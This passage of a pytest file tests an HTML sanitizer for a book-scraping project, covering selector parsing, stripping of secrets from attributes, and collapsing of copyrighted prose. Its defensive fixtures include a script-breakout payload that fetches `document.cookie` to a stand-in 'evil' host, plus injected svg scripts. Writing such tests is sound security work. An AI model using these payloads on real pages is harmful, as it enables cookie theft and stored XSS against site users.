    assert [_text_content(m) for m in matches] == ["9780123456789"]


def test_has_text_scopes_amazon_expander_group() -> None:
    """FIX (over-match): the amazon expander group only matches named headers."""
    from bookscraper.scraping.parameters import site_constants
    from bookscraper.scraping.sanitize import _select, _text_content

    html = (
        '<a class="a-expander-header">Product details</a>'
        '<a class="a-expander-header">Reviews</a>'
        '<a class="a-expander-header">Product information</a>'
    )
    matches = _select(_parse(html), site_constants["amazon"]["DETAILS_BUTTON"])
    texts = {_text_content(m) for m in matches}
    assert texts == {"Product details", "Product information"}
    assert "Reviews" not in texts


def test_has_text_is_case_insensitive() -> None:
    """:has-text matches case-insensitively on normalized text content."""
    from bookscraper.scraping.sanitize import _select

    root = _parse("<a>PRODUCT DETAILS</a>")
    assert len(_select(root, "a:has-text('product details')")) == 1


def test_unknown_pseudo_class_raises() -> None:
    """FIX (fail-closed): an unsupported pseudo-class raises, never silently ignored."""
    from bookscraper.scraping.sanitize import _select

    root = _parse("<div></div>")
    with pytest.raises(SanitizationError):
        _select(root, "div:nth-last-of-type(2)")


def test_pseudo_element_raises() -> None:
    """FIX (fail-closed): a pseudo-element raises."""
    from bookscraper.scraping.sanitize import _select

    with pytest.raises(SanitizationError):
        _select(_parse("<p></p>"), "p::before")


def test_has_text_without_parens_raises() -> None:
    """FIX (fail-closed): :has-text with no argument list raises."""
    from bookscraper.scraping.sanitize import _select

    with pytest.raises(SanitizationError):
        _select(_parse("<span></span>"), "span:has-text")


def test_has_text_unterminated_raises() -> None:
    """FIX (fail-closed): an unterminated :has-text() raises."""
    from bookscraper.scraping.sanitize import _select

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a:has-text('x'")


def test_has_text_regex_form_raises() -> None:
    """FIX (fail-closed): the regex :has-text(/re/) variant is out of scope and raises."""
    from bookscraper.scraping.sanitize import _select

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a:has-text(/x/)")


def test_attribute_operator_unsupported_raises() -> None:
    """FIX (fail-closed): a non-'=' attribute operator raises."""
    from bookscraper.scraping.sanitize import _select

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a[data-x~=b]")


def test_unterminated_attribute_selector_raises() -> None:
    """FIX (fail-closed): an unterminated attribute selector raises."""
    with pytest.raises(SanitizationError):
        _split_group("[attr")


def test_unsupported_character_raises() -> None:
    """FIX (fail-closed): a stray unsupported character raises."""
    from bookscraper.scraping.sanitize import _select

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a%b")


def test_neutralize_prose_neutralizes_li_not_matching_has_text() -> None:
    """FIX (policy): a long <li> that does NOT match :has-text('ISBN:') is neutralized.

    Scenario: the oreilly ISBN keep-selector must protect only the ISBN row; a long
    marketing <li> that would previously be over-protected must collapse.
    Boundaries: the ISBN span's value survives; the marketing prose becomes the
    placeholder.
    On failure: copyrighted prose survives in the public corpus.
    """
    from bookscraper.scraping.parameters import site_constants

    long_prose = "This is a long marketing blurb about the book. " * 6
    html = f'<ul><li>{long_prose}</li><li>ISBN: <span class="value t-isbn">9780123456789</span></li></ul>'
    out = neutralize_prose(html, [site_constants["oreilly"]["ISBN13"]])
    assert "9780123456789" in out
    assert long_prose.strip() not in out
    assert PROSE_PLACEHOLDER in out


# --------------------------------------------------------------------------- #
# V-2 - JSON-shaped data-* values are parsed and sanitized
# --------------------------------------------------------------------------- #
def test_v2_sensitive_named_data_attrs_dropped() -> None:
    """V-2 [HIGH]: state/config/auth-named data-* (incl. data-a-*) are dropped whole.

    Scenario: a hydration blob rides in data-state / data-config / data-a-state.
    Boundaries: dropped by name regardless of length; unrelated data-* survive.
    On failure: a session/tracking token is committed to public git.
    """
    html = (
        '<div data-state=\'{"authToken":"aQ3mZ9kLp2rX7vN4bC8dF1gH"}\' '
        'data-config=\'{"sid":"9f8e7d6c5b4a"}\' '
        'data-a-state=\'{"x":1}\' data-title="Fluent Python">x</div>'
    )
    out = strip_secrets(html)
    assert "aQ3mZ9kLp2rX7vN4bC8dF1gH" not in out
    assert "9f8e7d6c5b4a" not in out
    assert "data-state" not in out
    assert "data-config" not in out
    assert "data-a-state" not in out
    assert 'data-title="Fluent Python"' in out


def test_r2_json_data_attr_with_non_sensitive_name_is_dropped() -> None:
    """R-2 [MEDIUM]: a JSON-looking data-* is dropped wholesale, whatever the key.

    Scenario: a token hides in a short JSON blob under an innocuous attribute name
    (nested-as-string, bare array, or generic key like id/value) - key-name redaction
    alone missed these.
    Boundaries: no site_constants selector reads a JSON-valued data-*, so the whole
    attribute is dropped; a non-JSON factual sibling attribute is kept.
    On failure: an opaque session/tracking id under a bland key reaches public git.
    """
    tok = "aQ3mZ9kLp2rX7vN4bC8dF1gH"
    cases = [
        '<div data-hydration=\'{"inner":"{\\"apikey\\":\\"%s\\"}"}\' data-title="Fluent">x</div>' % tok,
        '<div data-hydration=\'["%s","%s"]\' data-title="Fluent">x</div>' % (tok, tok[::-1]),
        '<div data-hydration=\'{"id":"%s","value":"%s"}\' data-title="Fluent">x</div>' % (tok, tok),
        '<div data-hydration="{&quot;apikey&quot;:&quot;%s&quot;}" data-title="Fluent">x</div>' % tok,
    ]
    for html in cases:
        out = strip_secrets(html)
        assert tok not in out
        assert "data-hydration" not in out
        assert 'data-title="Fluent"' in out
        assert_clean(sanitize_html(html))


def test_r2_unparseable_json_looking_data_attr_dropped() -> None:
    """R-2: a JSON-looking but unparseable data-* value is dropped."""
    out = strip_secrets("<div data-x='{not valid json' data-keep=\"v\">x</div>")
    assert "not valid json" not in out
    assert 'data-keep="v"' in out


# --------------------------------------------------------------------------- #
# V-3 - ld+json re-embed is output-encoded (no </script> breakout)
# --------------------------------------------------------------------------- #
def test_v3_ld_json_script_breakout_is_neutralized() -> None:
    """V-3 [HIGH]: a `</script>` inside a JSON string cannot break out of the element.

    Scenario: a hostile ld+json value contains `</script><script>...`.
    Boundaries: after sanitize the output has exactly one ld+json script whose JSON
    loads and equals the sanitized object, and no other script element or live
    `</script><script>` sequence.
    On failure: attacker script is injected into a committed fixture (stored XSS).
    """
    from bookscraper.scraping.sanitize import _iter_elements

    ld = {"@type": "Book", "name": "X</script><script>fetch('//evil?c='+document.cookie)</script>"}
    # Realistic hostile source: the closing tag is JSON-escaped so the browser/parser
    # keeps it as one rawtext blob whose decoded value still carries `</script>`.
    src = json.dumps(ld).replace("</", "<\\/")
    out = sanitize_ld_json(f'<script type="application/ld+json">{src}</script>')
    assert "</script><script>" not in out
    scripts = [el for el in _iter_elements(_parse(out)) if el.tag == "script"]
    assert len(scripts) == 1
    raw = "".join(c.data for c in scripts[0].children)
    assert json.loads(raw) == sanitize_json(ld)

    # Full pipeline: even a literal-`</script>` breakout attempt injects no live script.
    literal = f'<script type="application/ld+json">{json.dumps(ld)}</script>'
    piped = sanitize_html(literal, [])
    assert "fetch('//evil" not in piped


# --------------------------------------------------------------------------- #
# V-5 - prose chunked under threshold across siblings is neutralized
# --------------------------------------------------------------------------- #
def test_v5_prose_chunked_across_siblings_is_neutralized() -> None:
    """V-5 [MEDIUM]: prose split into sub-200-char sibling spans still collapses.

    Scenario: marketing copy is chunked across three 180-char spans with no prose class.
    Boundaries: aggregate collapsed length triggers neutralization.
    On failure: copyrighted long-form text reaches the public repo.
    """
    chunk = ("This is copyrighted marketing prose that must never ship to a public repo. " * 2)[:180]
    html = f'<div class="col"><span>{chunk}</span><span>{chunk}</span><span>{chunk}</span></div>'
    out = neutralize_prose(html, [])
    assert chunk.strip() not in out
    assert PROSE_PLACEHOLDER in out


def test_v5_long_direct_text_beside_protected_field_is_neutralized() -> None:
    """V-5: long direct text next to a protected field collapses; the field survives."""
    long_text = "q" * 300
    html = f'<div>{long_text}<span id="keep">978-1</span></div>'
    out = neutralize_prose(html, ["#keep"])
    assert long_text not in out
    assert "978-1" in out
    assert PROSE_PLACEHOLDER in out


def test_v5_prose_container_long_text_beside_protected_field_is_neutralized() -> None:
    """V-5: long prose-container text beside a protected field collapses; field survives."""
    prose = "Loved this book and would happily recommend it to any reader who is curious. " * 2
    html = f'<div class="review">{prose}<span id="keep">K</span></div>'
    out = neutralize_prose(html, ["#keep"])
    assert prose.strip() not in out
    assert "K" in out
    assert PROSE_PLACEHOLDER in out


def test_v5_prose_chunked_into_sub_80_char_spans_is_neutralized() -> None:
    """V-5 (re-fix): prose split into many <80-char sibling spans still collapses.

    Scenario: a description <div> holds ten 60-char <span> sentences; each is individually
    under the 80-char floor, so per-node neutralization alone would leak them verbatim.
    Boundaries: aggregate detection fires on the div; exactly one placeholder results, no
    original sentence survives, and the div and all ten spans remain in the DOM.
    On failure: copyrighted prose reaches the public repo by being chunked small.
    """
    from bookscraper.scraping.sanitize import _select

    sentence = "Each of these sentences is exactly sixty characters long okay!"  # ~60 chars
    assert len(sentence) < sanitize.PROSE_MIN_CHARS
    spans = "".join(f"<span>{sentence}</span>" for _ in range(10))
    html = f'<div class="description">{spans}</div>'
    out = neutralize_prose(html, [])
    assert out.count(PROSE_PLACEHOLDER) == 1
    assert sentence not in out
    root = _parse(out)
    assert len(_select(root, "div.description")) == 1
    assert len(_select(root, "div.description span")) == 10


def test_neutralize_prose_keeps_short_prose_heading_for_selector() -> None:
    """Over-neutralization fix: a short prose-named heading survives; its body collapses.

    Scenario: O'Reilly's ``h2.t-description-heading:has-text("Book description") + span``
    selector needs the heading text; neutralizing the short heading broke it.
    Boundaries: the short "Book description" heading stays verbatim (so the selector
    still resolves), while the long description span collapses to the placeholder.
    On failure: the O'Reilly description golden can never match.
    """
    from bookscraper.scraping.sanitize import _select, _text_content

    body = "Long copyrighted description sentence that must be neutralized. " * 8
    html = (
        '<div id="root">'
        '<h1 class="t-title">OReilly Book Title</h1>'
        '<h2 class="t-description-heading">Book description</h2>'
        f"<span>{body}</span>"
        "</div>"
    )
    out = neutralize_prose(html, ["h1.t-title"])
    assert "Book description" in out
    assert "OReilly Book Title" in out
    assert body.strip() not in out
    assert PROSE_PLACEHOLDER in out
    # The description selector still resolves to the (now-neutralized) span.
    matched = _select(_parse(out), 'h2.t-description-heading:has-text("Book description") + span')
    assert len(matched) == 1
    assert _text_content(matched[0]) == PROSE_PLACEHOLDER


def _keep_text_for(site: str) -> list[str]:
    """Detail selectors a capture protects verbatim: all except the description."""
    from bookscraper.scraping.parameters import site_constants

    skip = {"DESCRIPTION", "DESCRIPTION_ALT", "BASE_URL", "404_PAGE_TITLE"}
    out = []
    for key, value in site_constants[site].items():
        if key in skip or key.startswith("SEARCH_") or key.endswith("_API"):
            continue
        if isinstance(value, str) and value:
            out.append(value)
    return out


# Per-site representative markup: factual fields (verbatim) + a long description body.
_SITE_DESCRIPTION_MARKUP = {
    "amazon": {
        "html": (
            '<div id="dp">'
            '<span id="productTitle">Fluent Python</span>'
            '<div class="author"><a class="a-link-normal">Luciano Ramalho</a></div>'
            '<div id="rpi-attribute-book_details-isbn13"><div class="rpi-attribute-value"><span>9781492056355</span></div></div>'
            '<div id="rpi-attribute-book_details-publication_date"><div class="rpi-attribute-value"><span>April 1, 2022</span></div></div>'
            '<div id="bookDescription_feature_div"><div class="a-expander-content"><span>'
            + ("A long copyrighted marketing description of the book. " * 8)
            + "</span></div></div>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "Fluent Python",
            "AUTHORS": "Luciano Ramalho",
            "ISBN13": "9781492056355",
            "PUBLICATION_DATE": "April 1, 2022",
        },
    },
    "packtpub": {
        "html": (
            "<div>"
            '<h1 class="product-title">Learn Python</h1>'
            '<div class="authors"><span>Jane Author</span></div>'
            '<div class="product-page-rhs desktop">'
            '<span class="product-details-section-key">ISBN-13 :</span>'
            '<span class="product-details-section-value">9781800000000</span>'
            '<span class="product-details-section-key">Publication date :</span>'
            '<span class="product-details-section-value">May 2023</span>'
            "</div>"
            '<div class="product-book-content-details">'
            "<h2>Description</h2>"
            '<div class="content-text">' + ("A long copyrighted book description body here. " * 8) + "</div>"
            "</div>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "Learn Python",
            "AUTHORS": "Jane Author",
            "ISBN13": "9781800000000",
            "PUBLICATION_DATE": "May 2023",
        },
    },
    "oreilly": {
        "html": (
            '<div id="root">'
            '<h1 class="t-title">OReilly Python</h1>'
            '<a class="author-name">Sam Writer</a>'
            "<ul>"
            '<li>ISBN: <span class="value t-isbn">9780123456789</span></li>'
            '<li>Release date: <span class="value">June 2021</span></li>'
            "</ul>"
            '<h2 class="t-description-heading">Book description</h2>'
            "<span>" + ("A long copyrighted book description body here. " * 8) + "</span>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "OReilly Python",
            "AUTHORS": "Sam Writer",
            "ISBN13": "9780123456789",
            "PUBLICATION_DATE": "June 2021",
        },
    },
    "leanpub": {
        "html": (
            "<div>"
            '<h1 class="book-hero__title ltr">Leanpub Python</h1>'
            '<div class="avatar-with-name__name">Chris Maker</div>'
            '<div class="about-book__content">' + ("A long copyrighted book description body here. " * 8) + "</div>"
            "</div>"
        ),
        "verbatim": {
            "BOOK_TITLE": "Leanpub Python",
            "AUTHORS": "Chris Maker",
        },
    },
}


def test_description_selectors_survive_sanitize_for_all_sites() -> None:
    """Golden fix: every site's DESCRIPTION selector still matches after sanitize_html.

    Scenario: subtask 04 goldens recorded a scrape FAILED because neutralization deleted
    the description element (and its parents), so the selector could never match.
    Boundaries: for all four sites the DESCRIPTION selector resolves and its element's
    text is the placeholder; TITLE/AUTHORS/ISBN/date selectors resolve with text verbatim.
    On failure: the fixture pipeline itself causes a false scrape failure.
    """
    from bookscraper.scraping.parameters import site_constants
    from bookscraper.scraping.sanitize import _select, _text_content

    for site, spec in _SITE_DESCRIPTION_MARKUP.items():
        keep_text = _keep_text_for(site)
        out = sanitize_html(spec["html"], keep_text)
        root = _parse(out)

        # Factual selectors still match, text verbatim.
        for key, expected in spec["verbatim"].items():
            selector = site_constants[site][key]
            matched = _select(root, selector)
            assert matched, f"{site}.{key} selector lost after sanitize"
            assert expected in _text_content(matched[0]), f"{site}.{key} text changed"

        # DESCRIPTION selector still matches, element kept, text neutralized.
        desc_selector = site_constants[site]["DESCRIPTION"]
        desc = _select(root, desc_selector)
        assert desc, f"{site} DESCRIPTION selector lost after sanitize"
        assert _text_content(desc[0]) == PROSE_PLACEHOLDER, f"{site} description not neutralized"


# --------------------------------------------------------------------------- #
# V-6 - opaque inline style values
# --------------------------------------------------------------------------- #
def test_v6_opaque_style_data_url_is_dropped() -> None:
    """V-6 [LOW]: an inline style carrying a base64 url(data:...) blob is dropped."""
    blob = "A" * 300
    out = strip_secrets(f'<div style="background:url(data:image/png;base64,{blob})" id="k">x</div>')
    assert blob not in out
    assert "url(data:" not in out
    assert 'id="k"' in out


# --------------------------------------------------------------------------- #
# V-7 - namespaced script tags are stripped
# --------------------------------------------------------------------------- #
def test_v7_namespaced_svg_script_is_stripped() -> None:
    """V-7 [LOW]: a `<svg:script>` (local name script) is stripped like `<script>`."""
    html = '<svg><script>fetch("//evil")</script></svg><svg><svg:script>alert(1)</svg:script></svg>'
    out = strip_scripts_and_styles(html)
    assert 'fetch("//evil")' not in out
    assert "alert(1)" not in out


# --------------------------------------------------------------------------- #
# top-level composition + hostile page
# --------------------------------------------------------------------------- #
def test_sanitize_text_rewrites_emails() -> None:
    """The plain-text sanitizer (robots.txt) rewrites emails."""
    assert EMAIL_PLACEHOLDER in sanitize_text("abuse@corp-real.com")


def test_hostile_page_is_cleaned_and_neutralized() -> None:
    """A page carrying every corpus-specific secret comes out clean and neutralized.

    Scenario: cookie echo, CSRF meta, an inline __INITIAL_STATE__ blob with a session
    token, a signed S3 URL in srcset, a long sensitive data-*, an email, and an ld+json
    blob holding an email and a long description.
    Boundaries: sanitize_html strips/neutralizes all of it and factual metadata (title)
    survives; assert_clean then passes on the result.
    On failure: a real secret would reach permanent public history.
    """
    long_desc = "Highly confidential marketing copy that must never ship. " * 6
    ld = {
        "@type": "Book",
        "name": "Fluent Python",
        "authorEmail": "author@corp-real.com",
        "description": long_desc,
        "image": "https://cdn.test/c.jpg?X-Amz-Signature=deadbeef",
    }
    html = (
        "<!DOCTYPE html><html><head>"
        '<meta http-equiv="Set-Cookie" content="session-id=176-000">'
        '<meta name="csrf-token" content="tok-abcdef123456">'
        f'<script type="application/ld+json">{json.dumps(ld)}</script>'
        '<script>window.__INITIAL_STATE__={"auth":{"sessionToken":"eyJhbGciOiJI.eyJzdWIi.sig"}}</script>'
        "</head><body>"
        '<h1 id="productTitle">Fluent Python</h1>'
        f'<div data-session-token="{"z" * 40}">t</div>'
        '<img srcset="https://cdn.test/big.jpg?X-Amz-Signature=sig 2x">'
        "<p>Reach the author at author@corp-real.com anytime.</p>"
        f'<div id="bookDescription_feature_div">{long_desc}</div>'
        "</body></html>"
    )
    out = sanitize_html(html, ["#productTitle"])

    # Factual metadata survives.
    assert "Fluent Python" in out
    # Every secret / prose is gone.
    assert "__INITIAL_STATE__" not in out
    assert "sessionToken" not in out
    assert "eyJhbGciOiJI" not in out
    assert "X-Amz-Signature" not in out
    assert "data-session-token" not in out
    assert "author@corp-real.com" not in out
    assert "csrf-token" not in out
    assert "Set-Cookie" not in out
    assert long_desc.strip() not in out
    assert PROSE_PLACEHOLDER in out

    # The final gate passes on the sanitized output.
    assert_clean(out)
